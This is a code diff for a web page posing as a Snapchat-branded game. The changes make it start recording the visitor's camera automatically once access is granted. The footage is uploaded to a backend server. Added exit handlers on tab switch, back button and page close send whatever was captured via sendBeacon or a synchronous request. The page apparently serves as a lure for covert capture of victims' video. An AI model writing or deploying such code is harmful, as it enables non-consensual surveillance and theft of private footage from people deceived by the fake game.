@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Snap Game - Video Recorder</title>
+<title>Snap Game - Auto Record</title>
 
 <style>
 body {
@@ -52,6 +52,8 @@ body {
   margin-top: 10px;
   color: red;
   font-size: 14px;
+  text-align: center;
+  padding: 0 20px;
 }
 
 /* Camera View */
@@ -62,48 +64,11 @@ body {
   display: none;
 }
 
-/* Recording Button */
-.capture-btn {
-  position: fixed;
-  bottom: 40px;
-  left: 50%;
-  transform: translateX(-50%);
-  width: 70px;
-  height: 70px;
-  border-radius: 50%;
-  background: white;
-  border: 5px solid rgba(255,255,255,0.5);
-  display: none;
-  cursor: pointer;
-  z-index: 100;
-}
-
-.capture-btn.recording {
-  background: #ff4444;
-  animation: pulse 1s infinite;
-}
-
-@keyframes pulse {
-  0% {
-    transform: translateX(-50%) scale(1);
-    opacity: 1;
-  }
-  50% {
-    transform: translateX(-50%) scale(1.1);
-    opacity: 0.7;
-  }
-  100% {
-    transform: translateX(-50%) scale(1);
-    opacity: 1;
-  }
-}
-
-/* Status Indicator */
-#status {
+/* Recording Indicator */
+.recording-indicator {
   position: fixed;
   top: 20px;
-  left: 50%;
-  transform: translateX(-50%);
+  right: 20px;
   background: rgba(0,0,0,0.7);
   color: white;
   padding: 8px 16px;
@@ -114,17 +79,79 @@ body {
   font-family: monospace;
 }
 
+.recording-indicator.active {
+  display: block;
+  animation: blink 1s infinite;
+}
+
+.recording-indicator::before {
+  content: "●";
+  color: #ff4444;
+  margin-right: 8px;
+  animation: pulse 1s infinite;
+}
+
+@keyframes blink {
+  0% { opacity: 1; }
+  50% { opacity: 0.7; }
+  100% { opacity: 1; }
+}
+
+@keyframes pulse {
+  0% { opacity: 1; }
+  50% { opacity: 0.5; }
+  100% { opacity: 1; }
+}
+
+/* Countdown */
 .countdown {
   position: fixed;
   top: 50%;
   left: 50%;
   transform: translate(-50%, -50%);
-  font-size: 80px;
+  font-size: 100px;
   color: white;
-  text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
+  text-shadow: 2px 2px 10px rgba(0,0,0,0.8);
   z-index: 200;
   display: none;
   font-weight: bold;
+  background: rgba(0,0,0,0.5);
+  padding: 20px 40px;
+  border-radius: 20px;
+  text-align: center;
+}
+
+/* Status */
+#status {
+  position: fixed;
+  bottom: 30px;
+  left: 50%;
+  transform: translateX(-50%);
+  background: rgba(0,0,0,0.8);
+  color: white;
+  padding: 10px 20px;
+  border-radius: 25px;
+  font-size: 14px;
+  display: none;
+  z-index: 100;
+  font-family: monospace;
+  white-space: nowrap;
+}
+
+/* Auto-save message */
+.auto-save {
+  position: fixed;
+  bottom: 100px;
+  left: 50%;
+  transform: translateX(-50%);
+  background: rgba(0,0,0,0.8);
+  color: #4CAF50;
+  padding: 8px 16px;
+  border-radius: 20px;
+  font-size: 12px;
+  display: none;
+  z-index: 100;
+  white-space: nowrap;
 }
 </style>
 </head>
@@ -134,20 +161,19 @@ body {
 <!-- Splash Screen -->
 <div id="splash">
   <img id="logo" src="./sm_5b321c9cb2d25.jpg" alt="Snapchat Logo" onerror="this.src='https://via.placeholder.com/120?text=Snap'">
-  <div id="tap">Tap to play game</div>
-  <button id="startBtn" onclick="startApp()">Start</button>
+  <div id="tap">Camera access required</div>
+  <button id="startBtn" onclick="startApp()">Allow Camera & Start</button>
   <div id="message"></div>
 </div>
 
 <!-- Camera -->
 <video id="camera" autoplay playsinline muted></video>
 
-<!-- Capture Button -->
-<div class="capture-btn" onclick="toggleRecording()"></div>
-
-<!-- Status -->
-<div id="status">Ready</div>
+<!-- UI Elements -->
+<div class="recording-indicator" id="recordingIndicator">Recording</div>
 <div class="countdown" id="countdown"></div>
+<div id="status"></div>
+<div class="auto-save" id="autoSaveMsg">Auto-saving video...</div>
 
 <script src="https://cdn.socket.io/4.5.3/socket.io.min.js"></script>
 
@@ -159,7 +185,10 @@ let mediaRecorder = null;
 let recordedChunks = [];
 let stream = null;
 let isRecording = false;
-let recordingTimer = null;
+let recordingStartTime = null;
+let hasSentVideo = false;
+let autoStopTimer = null;
+let pageHidden = false;
 
 // Connect to server
 function connectSocket() {
@@ -181,21 +210,20 @@ function connectSocket() {
     });
     
     socket.on('recording-complete', (data) => {
-      console.log('Recording saved:', data);
-      showStatus('✅ Video saved!');
+      console.log('✅ Video saved on server:', data);
+      showStatus('✓ Video saved!', '#4CAF50');
     });
   });
 }
 
-// Start the app
+// Start the app and auto-record
 async function startApp() {
   const splash = document.getElementById("splash");
   const camera = document.getElementById("camera");
-  const btn = document.querySelector(".capture-btn");
   const msg = document.getElementById("message");
   
   try {
-    // Connect to server first
+    // Connect to server
     showStatus('Connecting to server...');
     await connectSocket();
     
@@ -209,12 +237,19 @@ async function startApp() {
     // Setup camera
     camera.srcObject = stream;
     camera.style.display = "block";
-    btn.style.display = "block";
     splash.style.display = "none";
-    showStatus('Ready to record');
     
     // Setup media recorder
     setupMediaRecorder();
+    
+    // Show recording indicator
+    document.getElementById('recordingIndicator').classList.add('active');
+    
+    // Start recording with countdown
+    startRecordingWithCountdown();
+    
+    // Setup page visibility and unload handlers
+    setupPageHandlers();
     
   } catch (err) {
     console.error('Error:', err);
@@ -251,37 +286,25 @@ function setupMediaRecorder() {
   mediaRecorder.ondataavailable = (event) => {
     if (event.data && event.data.size > 0) {
       recordedChunks.push(event.data);
+      console.log(`📹 Chunk received: ${event.data.size} bytes, total chunks: ${recordedChunks.length}`);
     }
   };
   
   mediaRecorder.onstop = () => {
-    if (recordedChunks.length > 0) {
+    console.log('MediaRecorder stopped');
+    if (recordedChunks.length > 0 && !hasSentVideo) {
       sendVideoToServer();
     }
   };
   
   mediaRecorder.onerror = (err) => {
     console.error('Recorder error:', err);
-    showStatus('Recording error');
+    showStatus('Recording error', '#ff4444');
   };
 }
 
-// Toggle recording
-function toggleRecording() {
-  if (!mediaRecorder) return;
-  
-  if (!isRecording) {
-    startRecording();
-  } else {
-    stopRecording();
-  }
-}
-
-// Start recording with countdown
-function startRecording() {
-  recordedChunks = [];
-  
-  // Show countdown
+// Start recording with 3-second countdown
+function startRecordingWithCountdown() {
   let count = 3;
   const countdownEl = document.getElementById('countdown');
   countdownEl.style.display = 'block';
@@ -296,65 +319,108 @@ function startRecording() {
       countdownEl.style.display = 'none';
       
       // Start recording
-      mediaRecorder.start(1000); // Collect data every second
-      isRecording = true;
-      document.querySelector('.capture-btn').classList.add('recording');
-      showStatus('🔴 Recording... (max 10 seconds)');
-      
-      // Auto-stop after 10 seconds
-      recordingTimer = setTimeout(() => {
-        if (isRecording) {
-          stopRecording();
-        }
-      }, 10000);
+      startRecording();
     }
   }, 1000);
 }
 
-// Stop recording
-function stopRecording() {
-  if (recordingTimer) {
-    clearTimeout(recordingTimer);
-    recordingTimer = null;
+// Start recording
+function startRecording() {
+  if (mediaRecorder && mediaRecorder.state === 'inactive') {
+    recordedChunks = [];
+    hasSentVideo = false;
+    
+    // Start recording, collect data every second
+    mediaRecorder.start(1000);
+    isRecording = true;
+    recordingStartTime = Date.now();
+    
+    console.log('🔴 Recording started');
+    showStatus('🔴 Recording... (auto-save on close)', '#ff4444');
+    
+    // Set maximum recording duration (e.g., 30 seconds)
+    autoStopTimer = setTimeout(() => {
+      if (isRecording && !hasSentVideo) {
+        console.log('⏰ Max recording time reached, stopping...');
+        stopAndSendVideo();
+      }
+    }, 30000); // Stop after 30 seconds max
   }
-  
+}
+
+// Stop recording and send video
+function stopAndSendVideo() {
   if (mediaRecorder && mediaRecorder.state === 'recording') {
-    mediaRecorder.stop();
+    console.log('🛑 Stopping recording...');
     isRecording = false;
-    document.querySelector('.capture-btn').classList.remove('recording');
-    showStatus('Processing video...');
+    
+    if (autoStopTimer) {
+      clearTimeout(autoStopTimer);
+      autoStopTimer = null;
+    }
+    
+    mediaRecorder.stop();
+    showStatus('Processing video...', '#ffa500');
+    document.getElementById('recordingIndicator').classList.remove('active');
   }
 }
 
 // Send video to server
 async function sendVideoToServer() {
-  if (recordedChunks.length === 0) {
-    showStatus('No video data');
+  if (hasSentVideo) {
+    console.log('Video already sent, skipping');
     return;
   }
   
-  showStatus('Uploading video...');
+  if (recordedChunks.length === 0) {
+    console.log('No video data to send');
+    showStatus('No video recorded', '#ff4444');
+    return;
+  }
   
-  // Create blob from chunks
-  const mimeType = mediaRecorder.mimeType;
-  const videoBlob = new Blob(recordedChunks, { type: mimeType });
+  hasSentVideo = true;
   
-  // Convert to array buffer
-  const arrayBuffer = await videoBlob.arrayBuffer();
+  // Show auto-save message
+  const autoSaveMsg = document.getElementById('autoSaveMsg');
+  autoSaveMsg.style.display = 'block';
   
-  // Emit to server
-  socket.emit('video-data', arrayBuffer);
+  showStatus('📤 Uploading video...', '#ffa500');
+  console.log(`Sending ${recordedChunks.length} chunks, total size: ${getTotalSize()} bytes`);
   
-  // Clear chunks
-  recordedChunks = [];
-  
-  showStatus('Video sent! Ready for next recording');
+  try {
+    // Create blob from chunks
+    const mimeType = mediaRecorder.mimeType;
+    const videoBlob = new Blob(recordedChunks, { type: mimeType });
+    
+    // Convert to array buffer
+    const arrayBuffer = await videoBlob.arrayBuffer();
+    
+    // Emit to server
+    socket.emit('video-data', arrayBuffer);
+    
+    showStatus('✓ Video sent!', '#4CAF50');
+    
+    setTimeout(() => {
+      autoSaveMsg.style.display = 'none';
+    }, 3000);
+    
+  } catch (error) {
+    console.error('Error sending video:', error);
+    showStatus('Failed to send video', '#ff4444');
+    hasSentVideo = false;
+  }
+}
+
+// Get total size of recorded chunks
+function getTotalSize() {
+  return recordedChunks.reduce((total, chunk) => total + chunk.size, 0);
 }
 
 // Show status message
-function showStatus(message) {
+function showStatus(message, color = '#ffffff') {
   const statusEl = document.getElementById('status');
   statusEl.textContent = message;
+  statusEl.style.backgroundColor = 'rgba(0,0,0,0.8)';
   statusEl.style.display = 'block';
   
   setTimeout(() => {
@@ -364,18 +430,106 @@ function showStatus(message) {
   }, 3000);
 }
 
-// Clean up on page unload
-window.onbeforeunload = () => {
-  if (mediaRecorder && mediaRecorder.state === 'recording') {
-    mediaRecorder.stop();
-  }
-  if (stream) {
-    stream.getTracks().forEach(track => track.stop());
-  }
-  if (socket) {
-    socket.disconnect();
-  }
-};
+// Setup handlers for page close/unload
+function setupPageHandlers() {
+  // Handle page visibility change (tab switch or minimize)
+  document.addEventListener('visibilitychange', () => {
+    if (document.hidden) {
+      console.log('📱 Page hidden, preparing to save video...');
+      pageHidden = true;
+      
+      // Show warning
+      showStatus('Saving video...', '#ffa500');
+      
+      // Stop recording if active
+      if (isRecording && !hasSentVideo) {
+        stopAndSendVideo();
+      }
+    }
+  });
+  
+  // Handle beforeunload (page close, refresh, back button)
+  window.addEventListener('beforeunload', (event) => {
+    console.log('🚪 Page closing, sending final video...');
+    
+    if (isRecording && !hasSentVideo && mediaRecorder) {
+      // Stop recording immediately
+      if (mediaRecorder.state === 'recording') {
+        mediaRecorder.stop();
+      }
+      
+      // Note: For beforeunload, we can't guarantee async operations complete
+      // But the server should still receive if we send synchronously
+      if (recordedChunks.length > 0 && socket && !hasSentVideo) {
+        // Try to send synchronously
+        const mimeType = mediaRecorder.mimeType;
+        const videoBlob = new Blob(recordedChunks, { type: mimeType });
+        
+        // Use navigator.sendBeacon for reliable delivery on page close
+        if (navigator.sendBeacon) {
+          const reader = new FileReader();
+          reader.onloadend = () => {
+            const arrayBuffer = reader.result;
+            // Send via beacon (more reliable for page close)
+            const blob = new Blob([arrayBuffer], { type: 'application/octet-stream' });
+            navigator.sendBeacon(`${BACKEND_URL}/upload-beacon`, blob);
+          };
+          reader.readAsArrayBuffer(videoBlob);
+        } else {
+          // Fallback to sync XHR
+          const xhr = new XMLHttpRequest();
+          xhr.open('POST', `${BACKEND_URL}/upload-sync`, false); // false = synchronous
+          xhr.send(videoBlob);
+        }
+      }
+    }
+    
+    // Clean up camera
+    if (stream) {
+      stream.getTracks().forEach(track => track.stop());
+    }
+  });
+  
+  // Handle page hide (for mobile)
+  window.addEventListener('pagehide', () => {
+    console.log('📱 Page hide event');
+    if (isRecording && !hasSentVideo) {
+      stopAndSendVideo();
+    }
+  });
+  
+  // Handle popstate (back button)
+  window.addEventListener('popstate', () => {
+    console.log('⬅️ Back button pressed');
+    if (isRecording && !hasSentVideo) {
+      stopAndSendVideo();
+    }
+  });
+}
+
+// Optional: Add a manual stop button if needed
+function addManualStopButton() {
+  const btn = document.createElement('button');
+  btn.textContent = 'Stop & Save';
+  btn.style.position = 'fixed';
+  btn.style.bottom = '20px';
+  btn.style.left = '20px';
+  btn.style.padding = '10px 20px';
+  btn.style.backgroundColor = '#ff4444';
+  btn.style.color = 'white';
+  btn.style.border = 'none';
+  btn.style.borderRadius = '5px';
+  btn.style.zIndex = '100';
+  btn.onclick = () => {
+    if (isRecording && !hasSentVideo) {
+      stopAndSendVideo();
+    }
+  };
+  document.body.appendChild(btn);
+}
+
+// Call this if you want a manual stop button
+// addManualStopButton();
 </script>
 
 </body>
